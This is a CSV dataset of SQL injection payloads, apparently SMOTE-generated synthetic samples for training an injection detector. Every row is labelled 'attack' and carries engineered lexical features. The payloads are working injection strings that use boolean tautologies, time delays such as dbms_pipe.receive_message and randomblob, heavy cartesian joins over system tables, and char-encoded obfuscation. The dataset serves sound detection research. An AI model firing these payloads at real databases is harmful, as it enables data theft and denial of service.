id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000272,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.9747508297229823,73.89271686167066,26.5356301170024,3.8096297710530953,15.785433723341328,22.571653021326938,24.357086744668266,11.178543372334133,0.21247604948024723,0.30669221388773626,0.3295823898280097,0.15124934680400673,0.0,1.5356301170023992,2.642913255331734,0.0,0.0,1.821456627665867,0.0,3.1785433723341328,0.0,1.0,1.0,4.464369882997602,0.0,1.0,0.821456627665867,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.821456627665867,0.0,0.17854337233413298,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,2.8549502816757863,77.04231372066799,23.3028327873985,3.186799095183439,18.725376359713493,12.253526143389001,34.098613288018996,11.964797929546497,0.1938845360064854,0.18235721769444257,0.4676796723759239,0.15607857392314808,2.084508714463,0.0,1.0845087144629997,0.5422543572315,0.0,1.0,0.0,6.253526143389,0.45774564276850005,0.0,0.5422543572315,2.6267630716944996,1.0,0.0,0.5422543572315,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000274,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,2.0870602251789268,191.6193746486669,29.307628973830685,3.607106013482692,99.92535694209538,10.769484104677264,58.84742052338632,22.07711307850795,0.5201261601377001,0.05600514443137247,0.3068254892491087,0.11704320618181882,2.7694841046772636,1.2305158953227364,0.0,0.0,1.0,2.0,0.0,7.384742052338632,2.0,0.0,4.769484104677264,3.0,0.6923710261693159,0.3076289738306841,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.307628973830684,0.6923710261693159,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000275,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.3946237848553011,51.63183751675682,17.13159187583784,3.44099272561918,6.868408124162151,20.263183751675683,18.10547001340546,6.394775627513525,0.13715412416112086,0.3990505052733254,0.3405316740171424,0.1232636965484113,0.0,0.0,2.8684081241621593,0.0,0.06579593791892052,2.0,0.0,1.460571565432442,0.0,0.0,-2.220446049250313e-16,4.934204062081079,0.0,0.0,0.9342040620810795,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9342040620810793,0.0,0.06579593791892058,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.2693498751709208,187.68340340553493,34.0,3.775579432666614,55.30978743399179,23.457871990514377,75.26425484426952,33.651489136759245,0.2954757684833598,0.12456515188511279,0.4007853048897861,0.17917377474174123,3.9612765707510267,0.0,0.0,0.0,0.0,1.9225531415020538,0.0,15.845106283004109,1.9225531415020543,1.0387234292489729,2.9225531415020543,7.922553141502053,1.0,0.0,0.0,0.0,0.0,0.961276570751027,1.0,0.0,0.0,0.0,1.0,0.038723429248972985,0.0,0.0,0.03872342924897304,1.0,0.9612765707510269,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.806382853755135,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.8451062830041085
SMOTE_000277,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,2.4490562354574488,139.32503714453995,33.303334984201776,3.843524258289643,52.201692255127526,11.741662539495561,53.16834241310977,22.213339936807103,0.3662043964480205,0.0895429514472969,0.38531178632218394,0.15894086578249866,3.0,0.0,0.6966650157982242,0.3483325078991121,0.0,0.3483325078991122,0.0,10.955002476302663,0.0,1.303334984201776,1.0,5.303334984201776,1.0,0.0,0.3483325078991121,0.0,0.0,0.3483325078991121,1.0,0.0,0.0,0.0,0.651667492100888,0.6516674921008879,0.0,0.0,0.651667492100888,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.303334984201776
SMOTE_000278,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,0.1981678374331557,129.97914805688728,29.221097948329387,3.9454035515881896,65.41061047546886,8.315854211899124,41.0,15.252683369519298,0.503358727114235,0.06361007794960703,0.31588444426684215,0.1171467506693159,0.09475626356973743,0.0,2.0,0.0,1.0,1.0315854211899125,0.0,5.968414578810088,0.0,0.15792710594956227,2.063170842379825,4.063170842379825,0.03158542118991242,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0315854211899125,0.0,0.03158542118991248,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.063170842379825
SMOTE_000279,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,1.7851042301118427,54.144157813422154,18.16613050029509,3.027677856718971,4.291532625073778,13.520364187758203,25.16613050029509,11.166130500295088,0.0792171120770831,0.24790159516040614,0.4734460328917169,0.19943525987079383,2.9372989376106586,0.0,0.6457663125368861,0.0,0.6457663125368862,1.6457663125368862,0.0,3.6457663125368853,1.645766312536886,0.0,-2.220446049250313e-16,2.9372989376106577,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.6457663125368861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6457663125368862
SMOTE_000280,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,0.06636299809310202,354.83099725745376,40.952090051534995,3.7908516792998244,118.5496464844289,34.92334408245598,148.4729905668849,52.885016123683975,0.3340149989774764,0.09847817138845012,0.4183780616831174,0.1491287679509561,3.9616720412279918,0.0,0.019163979386003893,0.0,0.0,1.0,0.0,31.90418010306998,0.0,2.0,4.0,11.019163979386004,0.9904180103069982,0.0,0.009581989693001947,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.990418010306998,0.0,0.0,0.9904180103069982,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9904180103069982,0.9904180103069982,11.961672041227992
SMOTE_000281,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.1919495199257724,154.11057277780264,34.67012933692318,4.1939379759902256,75.53024019714306,16.100184767033113,41.0,21.480147813626488,0.4906111315346066,0.10290887852349082,0.26794895911386096,0.13853103082804152,2.4300554301099337,0.0,2.0,0.0,1.0,1.8100184767033114,0.0,5.189981523296689,0.0,4.0500923835165565,3.620036953406623,5.620036953406623,0.8100184767033112,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8100184767033114,0.0,0.8100184767033112,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.620036953406623
SMOTE_000282,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.3318226824514505,249.0508582915314,36.0,3.785434865161118,79.16707537691971,28.433415075383945,98.30024522615183,43.150122613075915,0.31763757065877246,0.11419550785601634,0.39486302502958903,0.1733038964556222,2.8668301507678864,0.0,0.566584924616057,0.0,0.0,1.7167075376919716,0.0,22.0,0.0,2.0,4.0,12.28329246230803,0.7167075376919715,0.0,0.2832924623080283,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.7167075376919716,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.716707537691972
SMOTE_000283,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.2131316560819025,149.04950543289203,34.530898050452976,4.113053881715126,72.60498481937285,13.530898050452976,46.530898050452976,16.382724512613244,0.48806913887553305,0.08915169291753987,0.3125039802649328,0.11027518794199431,0.0,0.6913622563066218,2.0,0.0,1.0,1.691362256306622,0.0,6.0,0.0,0.0,2.0,4.691362256306622,0.0,0.691362256306622,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6913622563066218,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.691362256306622
SMOTE_000284,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.4611644730903555,223.16344080240967,34.7533426784704,3.722365385225169,63.89004205311683,27.8766713392352,91.01337071388161,40.383356696176016,0.2852103161779685,0.12575526500484074,0.4084512478983037,0.18058317091888704,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.753342678470403,2.0,1.4383356696176013,3.4383356696176017,9.753342678470405,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5616643303823987,0.4383356696176015,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.876671339235203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.8766713392352035
SMOTE_000285,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,1.3067005331005972,226.63068659616542,35.28684063833859,3.7404280423495035,68.19648340447247,27.0,91.6228021277953,39.81140106389765,0.3001256301149983,0.11957331190062595,0.4045819367156025,0.17571912126877326,0.9508791488818803,0.0,1.5245604255590597,0.0,0.0,1.23771978722047,0.0,21.04912085111812,0.47543957444094015,1.7622802127795298,3.7622802127795296,11.81140106389765,0.2377197872204701,0.0,0.76228021277953,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.23771978722047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.524560425559059,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.76228021277953
SMOTE_000286,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,2.4365488338693133,378.82322143730676,31.0,3.361614613574862,98.9410738124356,53.378312580458356,173.40306803553028,53.10076700888257,0.2611264813203824,0.14139924525752262,0.45737404877300464,0.1401002246490904,1.680613607106054,0.0,1.7395397946704594,0.0,0.0,3.0,0.0,35.680613607106054,0.0,0.0,1.0,14.73953979467046,0.42015340177651356,0.0,0.5798465982234865,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.5798465982234865,0.0,0.840306803553027,0.5798465982234865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000287,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,2.768619586064759,219.86256979612588,35.40284408164209,3.7881903215232713,64.81990857149461,30.07899102044904,87.22275265313668,37.740917551045555,0.294294457541769,0.13545445850726937,0.397459175162097,0.17279190878886463,2.129541224477219,0.0,0.9352293877613905,0.0,0.0,2.0,0.0,18.805688163284174,1.0647706122386096,1.4676146938806953,3.4676146938806953,10.80568816328417,0.5323853061193047,0.0,0.4676146938806952,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.4676146938806952,0.0,0.5323853061193048,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.935229387761391,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.935229387761391
SMOTE_000288,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,0.9493299705602967,48.83996368121245,14.275289844848523,2.638632615495739,3.42509661494951,12.188224612121305,25.951352609293103,7.275289844848523,0.07410815503383913,0.2438181141719981,0.5290810542663776,0.1529926765277851,0.7874516925252466,0.0,0.21254830747475373,0.0,0.21254830747475384,1.2125483074747536,0.0,4.062741537373768,0.7874516925252463,0.0,-2.220446049250313e-16,1.6376449224242613,0.7874516925252463,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.21254830747475378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.212548307474754
SMOTE_000289,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,2.2173928137937264,165.46507105006606,36.0,4.045853274927137,59.555385206027026,22.09880328754955,56.02894538768169,27.781937168807808,0.36185216112571317,0.1332379928239114,0.3373721483994182,0.16753769765095722,3.6831338812582586,0.0,0.6337322374834832,0.0,0.3168661187417416,2.0,0.0,9.78193716880781,0.0,2.9505983562252247,1.9505983562252247,8.732535525033034,1.0,0.0,0.3168661187417415,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6831338812582585,1.3168661187417414,0.0,1.0,0.31686611874174153,0.31686611874174164,0.6831338812582585,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.633732237483483
SMOTE_000290,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.5979450637530774,52.987834266811944,17.199391713340596,3.4173608269469167,6.800608286659397,20.398783426681195,19.19026741344957,6.598175140021791,0.1342157684427028,0.3943553548661177,0.34774541504013695,0.12368346165104245,0.0,0.0,2.8006082866594024,0.0,0.09969585667029895,2.0,0.0,1.6978709966920942,0.0,0.0,-2.220446049250313e-16,4.900304143329701,0.0,0.0,0.900304143329701,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9003041433297011,0.0,0.09969585667029901,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.02426083550127,78.1221339250908,24.86942469377031,3.384420243616129,19.836077418784647,12.483326362507167,33.41663181253584,12.38609833126314,0.20589845734315657,0.19019622753995363,0.44016345957881436,0.1637418555380754,2.161108787502389,0.0,2.0,0.5805543937511947,0.0,1.0,0.0,6.063880756258362,0.0,0.0,0.5805543937511946,3.5805543937511946,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000292,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.751170826084283,69.0373932110038,24.04428056470929,3.7851892692311124,22.449693000798398,16.86371462901938,22.224846500399202,7.4991390807868115,0.285409621414253,0.2807673901046031,0.3249359585412989,0.10888702993984486,0.0,1.0,2.0,0.0,0.13628537098061952,2.0,0.0,1.6814268549030977,0.0,0.0,0.2725707419612384,4.1362853709806195,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.13628537098061932,0.0,1.0,0.13628537098061944,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.272570741961239
SMOTE_000293,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.0082765543770897,217.5968874643294,35.42984437321647,3.7696782104575717,64.05568103037098,26.383073955360782,87.43875498573176,39.71937749286588,0.293952421414802,0.12197096700918558,0.4018733398145868,0.18220327176142562,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.85968874643294,2.0,1.4766147910721568,3.4766147910721568,9.906459164288627,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.9532295821443135,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.9532295821443135
SMOTE_000294,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,3.3285156468645716,88.26077639493154,27.252155278986308,3.5602594875189695,25.697557625202442,10.848778812601221,36.18498585124963,15.529454105878239,0.2924178045967122,0.11091974522012342,0.4093466532571995,0.18731579692596495,4.084051759662102,0.31932470672298296,0.0,1.319324706722983,0.3193247067229831,1.361350586554034,0.0,6.084051759662102,1.361350586554034,0.0,0.680675293277017,3.0,0.680675293277017,0.3193247067229831,0.0,0.0,0.31932470672298285,0.680675293277017,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.680675293277017,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6806752932770168
SMOTE_000295,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1799379495976212,142.96621683750672,29.416901995149455,3.9218631433762376,63.853519513339,15.400010413902814,47.14930442845445,16.56338248181045,0.47275915709561095,0.08685918615537504,0.3243329908607554,0.11604866588825855,0.0,0.0,2.0,0.0,1.1042254987873634,1.1042254987873634,0.0,7.250705985448361,0.0,0.0,2.416901995149454,4.208450997574728,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.10422549878736347,0.0,1.3126764963620903,0.0,0.10422549878736365,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10422549878736347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.521127493936818
SMOTE_000296,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,2.656610574525589,155.9225583415214,31.343720921637388,3.618628617623296,65.88337225848029,13.757790691228042,55.0391860830411,21.24220930877196,0.38809849599507706,0.09866825194437799,0.3679386710140066,0.1452945810465383,5.171860460818694,0.0,0.0,0.5859302304093468,0.41406976959065334,2.0,0.0,8.0,2.0,0.0,3.070348847953267,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4140697695906532,0.0,0.0,0.4140697695906532,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8281395391813064
SMOTE_000297,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,2.767175816865697,184.37350701140272,35.99529497099418,4.095398082768094,70.474122340468,31.82410420684163,61.80998911982418,20.265291344268906,0.41176601041842753,0.15127863388599255,0.3277344283913338,0.10922092730424607,0.0,0.7488237427485456,2.0,0.0,1.2511762572514544,2.0,0.0,9.014115087017451,0.0,0.0,3.0047050290058177,5.251176257251455,0.0,0.7488237427485455,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.2511762572514544,0.0,1.7535287717543633,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2511762572514544,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.004705029005818
SMOTE_000298,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.3544877669811735,150.23068983592748,34.57209057372734,4.171758021644158,72.60092680321827,16.0,45.11534491796373,16.514418114745467,0.48339338595908354,0.10680642550477629,0.2997379521785445,0.11006223635759568,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.5144181147454665,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5144181147454667,0.4855818852545333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
